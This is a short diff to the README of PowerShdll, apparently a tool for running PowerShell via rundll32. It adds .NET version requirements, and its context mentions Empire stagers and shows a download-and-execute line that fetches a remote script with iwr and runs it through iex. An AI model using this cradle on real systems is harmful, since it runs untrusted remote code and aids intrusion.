@@ -31,6 +31,10 @@ Note: Empire stagers need to be decoded using [System.Text.Encoding]::Unicode
 ```
 rundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;
 ```
+## Requirements
+.Net v3.5 for dll mode.
+.Net v2.0 for exe mode.
+
 ## Known Issues
 
 Some errors do not seem to show in the output. May be confusing as commands such as Import-Module do not output an error on failure.
